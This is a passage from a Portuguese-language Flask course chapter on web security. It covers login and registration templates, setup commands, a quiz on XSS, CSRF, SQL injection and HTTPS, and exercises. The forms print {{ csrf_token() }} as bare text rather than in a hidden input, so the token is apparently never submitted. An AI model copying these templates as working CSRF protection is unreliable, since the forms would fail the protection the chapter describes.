    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- CSS customizado -->
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
    
    <title>{% block title %}PokéBooster TCG{% endblock %}</title>
</head>
<body>
    <!-- Menu de Navegação -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="/">
                <strong>⚡ PokéBooster TCG</strong>
            </a>
            
            <!-- Menu mobile -->
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    {% if session.user_id %}
                        <li class="nav-item">
                            <a class="nav-link" href="{{ url_for('perfil') }}">
                                👤 Meu Perfil
                            </a>
                        </li>
                        <li class="nav-item">
                            <span class="navbar-text me-3">
                                Olá, <strong>{{ session.username }}</strong>
                            </span>
                        </li>
                        <li class="nav-item">
                            <a href="{{ url_for('logout') }}" class="btn btn-outline-light btn-sm">
                                Sair
                            </a>
                        </li>
                    {% else %}
                        <li class="nav-item">
                            <a href="{{ url_for('login') }}" class="btn btn-outline-light btn-sm me-2">
                                Entrar
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="{{ url_for('registro') }}" class="btn btn-primary btn-sm">
                                Criar Conta
                            </a>
                        </li>
                    {% endif %}
                </ul>
            </div>
        </div>
    </nav>
    
    <!-- Conteúdo Principal -->
    <main class="container mt-4">
        <!-- Mensagens Flash -->
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                {% for category, message in messages %}
                    <div class="alert alert-{{ category }} alert-dismissible fade show" role="alert">
                        {{ message }}
                        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                    </div>
                {% endfor %}
            {% endif %}
        {% endwith %}
        
        <!-- Conteúdo da página -->
        {% block content %}{% endblock %}
    </main>
    
    <!-- Rodapé -->
    <footer class="container mt-5 py-4 text-center text-muted border-top">
        <p>&copy; 2025 PokéBooster TCG | Fatec Jahu</p>
        <p class="small">Projeto educacional - Fundamentos de Python 2</p>
    </footer>
    
    <!-- Scripts -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="{{ url_for('static', filename='app.js') }}"></script>
</body>
</html>
```

### 📝 templates/login.html

```html
{% extends 'base.html' %}
{% block title %}Login - PokéBooster{% endblock %}

{% block content %}
<div class="row justify-content-center mt-5">
    <div class="col-md-5">
        <div class="card shadow">
            <div class="card-body p-5">
                <h2 class="card-title text-center mb-4">
                    🔑 Entrar
                </h2>
                
                <form method="POST" action="{{ url_for('login') }}">
                    {{ csrf_token() }}
                    
                    <div class="mb-3">
                        <label for="username" class="form-label">Nome de Usuário</label>
                        <input type="text" 
                               class="form-control form-control-lg" 
                               id="username" 
                               name="username" 
                               required
                               autofocus>
                    </div>
                    
                    <div class="mb-4">
                        <label for="senha" class="form-label">Senha</label>
                        <input type="password" 
                               class="form-control form-control-lg" 
                               id="senha" 
                               name="senha" 
                               required>
                    </div>
                    
                    <div class="d-grid gap-2">
                        <button type="submit" class="btn btn-primary btn-lg">
                            Entrar
                        </button>
                    </div>
                </form>
                
                <hr class="my-4">
                
                <div class="text-center">
                    <p class="mb-0">
                        Não tem uma conta? 
                        <a href="{{ url_for('registro') }}" class="text-decoration-none">
                            <strong>Criar Conta</strong>
                        </a>
                    </p>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}
```

### 📝 templates/registro.html

```html
{% extends 'base.html' %}
{% block title %}Criar Conta - PokéBooster{% endblock %}

{% block content %}
<div class="row justify-content-center mt-5">
    <div class="col-md-6">
        <div class="card shadow">
            <div class="card-body p-5">
                <h2 class="card-title text-center mb-4">
                    ✨ Criar Nova Conta
                </h2>
                
                <form method="POST" action="{{ url_for('registro') }}">
                    {{ csrf_token() }}
                    
                    <div class="mb-3">
                        <label for="username" class="form-label">Nome de Usuário</label>
                        <input type="text" 
                               class="form-control" 
                               id="username" 
                               name="username" 
                               required
                               minlength="3"
                               maxlength="80"
                               autofocus>
                        <div class="form-text">Mínimo 3 caracteres</div>
                    </div>
                    
                    <div class="mb-3">
                        <label for="email" class="form-label">E-mail</label>
                        <input type="email" 
                               class="form-control" 
                               id="email" 
                               name="email" 
                               required>
                    </div>
                    
                    <div class="mb-4">
                        <label for="senha" class="form-label">Senha</label>
                        <input type="password" 
                               class="form-control" 
                               id="senha" 
                               name="senha" 
                               required
                               minlength="8">
                        <div class="form-text">
                            Mínimo 8 caracteres. Use letras, números e símbolos.
                        </div>
                    </div>
                    
                    <div class="d-grid gap-2">
                        <button type="submit" class="btn btn-success btn-lg">
                            Criar Conta
                        </button>
                    </div>
                </form>
                
                <hr class="my-4">
                
                <div class="text-center">
                    <p class="mb-0">
                        Já tem uma conta? 
                        <a href="{{ url_for('login') }}" class="text-decoration-none">
                            <strong>Fazer Login</strong>
                        </a>
                    </p>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}
```

### 🔧 Inicialização do Banco de Dados

```bash
# Ativar venv
source venv/bin/activate  # Linux/Mac
# ou
venv\Scripts\activate  # Windows

# Criar tabelas
flask init-db

# Criar usuário admin (opcional)
flask create-admin

# Executar aplicação
flask run
```

### ✅ Testando o Sistema Completo

1. **Registro**: Acesse `/registro` e crie uma conta
2. **Login**: Faça login com as credenciais
3. **Proteção**: Tente acessar `/perfil` sem login (deve redirecionar)
4. **CSRF**: Tente fazer POST sem token (deve dar erro 400)
5. **Senhas**: Verifique no banco que as senhas estão em hash
6. **Logout**: Faça logout e verifique que a sessão foi limpa

---

## 6.9 Verifique seu Conhecimento

### ❓ Questão 1
Qual é a diferença entre autenticação e autorização?

**a)** Autenticação verifica o que o usuário pode fazer; autorização verifica quem ele é.  
**b)** Autenticação verifica quem é o usuário; autorização verifica o que ele pode fazer. ✅  
**c)** São sinônimos, significam a mesma coisa.  
**d)** Autenticação é para admins; autorização é para usuários comuns.

---

### ❓ Questão 2
Por que nunca devemos armazenar senhas em texto plano?

**a)** Porque o banco de dados não suporta strings grandes.  
**b)** Porque se o banco for comprometido, todas as senhas ficam expostas. ✅  
**c)** Porque o Flask não permite.  
**d)** Porque senhas em texto plano ocupam mais espaço.

---

### ❓ Questão 3
O que é XSS (Cross-Site Scripting)?

**a)** Um método de autenticação segura.  
**b)** Uma vulnerabilidade que permite injetar código malicioso em páginas vistas por outros usuários. ✅  
**c)** Um framework CSS.  
**d)** Um tipo de banco de dados.

---

### ❓ Questão 4
Como o Jinja2 protege contra XSS por padrão?

**a)** Ele bloqueia todo o JavaScript.  
**b)** Ele escapa automaticamente todas as variáveis, convertendo caracteres especiais. ✅  
**c)** Ele criptografa o HTML.  
**d)** Ele não protege; você precisa instalar uma extensão.

---

### ❓ Questão 5
O que é CSRF (Cross-Site Request Forgery)?

**a)** Um ataque que força o navegador a fazer requisições não autorizadas para sites onde o usuário está logado. ✅  
**b)** Um tipo de banco de dados.  
**c)** Uma forma de criptografar senhas.  
**d)** Um framework JavaScript.

---

### ❓ Questão 6
Como o Flask-WTF protege contra CSRF?

**a)** Ele bloqueia todos os formulários.  
**b)** Ele gera um token único que deve ser incluído em cada formulário e verificado no servidor. ✅  
**c)** Ele criptografa todos os dados do formulário.  
**d)** Ele só funciona com HTTPS.

---

### ❓ Questão 7
O que é SQL Injection?

**a)** Um método para otimizar queries SQL.  
**b)** Uma vulnerabilidade onde o atacante injeta código SQL malicioso através de inputs. ✅  
**c)** Uma ferramenta para testar bancos de dados.  
**d)** Um tipo de backup de banco de dados.

---

### ❓ Questão 8
Como o SQLAlchemy protege contra SQL Injection?

**a)** Ele bloqueia todos os inputs do usuário.  
**b)** Ele usa prepared statements que separam código SQL de dados. ✅  
**c)** Ele criptografa todas as queries.  
**d)** Ele não protege; você precisa validar manualmente.

---

### ❓ Questão 9
Por que HTTPS é essencial em produção?

**a)** Para fazer o site carregar mais rápido.  
**b)** Para criptografar toda a comunicação entre cliente e servidor, protegendo contra interceptação. ✅  
**c)** Porque o Google exige.  
**d)** Para economizar largura de banda.

---

### ❓ Questão 10
Por que usar variáveis de ambiente para dados sensíveis?

**a)** Para o código rodar mais rápido.  
**b)** Para não expor credenciais no código-fonte e facilitar diferentes configurações por ambiente. ✅  
**c)** Porque o Flask exige.  
**d)** Para economizar memória.

---

## 6.10 Exercícios Práticos

### 🎯 Exercício 1: Rate Limiting no Login

Instale e configure o Flask-Limiter para limitar tentativas de login:

```bash
pip install Flask-Limiter
```

**Tarefas:**
1. Configure o Flask-Limiter na aplicação
2. Limite a rota `/login` a 5 tentativas por minuto
3. Customize a mensagem de erro quando o limite é atingido
4. Teste fazendo múltiplas tentativas de login

---

### 🎯 Exercício 2: Validação de Senha Forte

Crie uma função que valide a força da senha:

**Requisitos:**
- Mínimo 8 caracteres
- Pelo menos uma letra maiúscula
- Pelo menos uma letra minúscula
- Pelo menos um número
- Pelo menos um caractere especial (!@#$%^&*)

**Tarefas:**
1. Implemente a função `validar_senha(senha)`
2. Retorne uma tupla `(bool, str)` com status e mensagem
3. Use na rota de registro
4. Adicione feedback visual no formulário

---

### 🎯 Exercício 3: Recuperação de Senha

Implemente um sistema básico de recuperação de senha:

**Tarefas:**
1. Crie uma tabela `PasswordResetToken` no banco
2. Crie rota `/esqueci-senha` que gera um token
3. Implemente envio de e-mail (ou simule com log)
4. Crie rota `/reset-senha/<token>` para redefinir
5. Tokens devem expirar após 1 hora

---

### 🎯 Exercício 4: Auditoria de Ações

Implemente um sistema de log de ações importantes:

**Tarefas:**
1. Crie tabela `AuditLog` com: user_id, ação, ip_address, timestamp
2. Registre ações como: login, logout, mudança de senha, deleção de conta
3. Crie rota `/admin/audit` (apenas admin) para ver logs
4. Implemente paginação nos logs

---

### 🎯 Exercício 5: Teste de Segurança

Escreva testes automatizados para verificar a segurança:

```python
# tests/test_seguranca.py
def test_xss_protection(client):
    """Testa se XSS é bloqueado."""
    pass

def test_csrf_protection(client):
    """Testa se CSRF é bloqueado."""
    pass

def test_sql_injection(client):
    """Testa se SQL Injection é bloqueado."""
    pass

def test_brute_force_login(client):
    """Testa proteção contra força bruta."""
    pass
```

**Tarefas:**
1. Implemente todos os testes acima
2. Execute com pytest
3. Documente resultados
4. Corrija falhas encontradas

---

## 📚 Resumo do Capítulo

Neste capítulo, você aprendeu:

✅ Por que segurança é crítica e as consequências de falhas  
✅ Diferença entre autenticação e autorização  
✅ Como proteger rotas com decoradores  
✅ Hashing seguro de senhas com bcrypt  
✅ O que é XSS e como o Jinja2 protege  
✅ Proteção contra CSRF com Flask-WTF  
✅ Como ORM previne SQL Injection  
✅ Importância de HTTPS em produção  
✅ Uso de variáveis de ambiente para credenciais  
✅ Implementação completa de login seguro

---

## 🎯 Próximo Capítulo

No [Capítulo 7](./capitulo_07.md), vamos concluir o curso! Revisaremos todo o projeto PokéBooster, aprenderemos como fazer **deploy** da aplicação em produção e discutiremos os **próximos passos** na sua jornada como desenvolvedor web.

---

**[← Capítulo Anterior](./capitulo_05.md)** | **[Voltar para README](../README.md)** | **[Próximo Capítulo →](./capitulo_07.md)**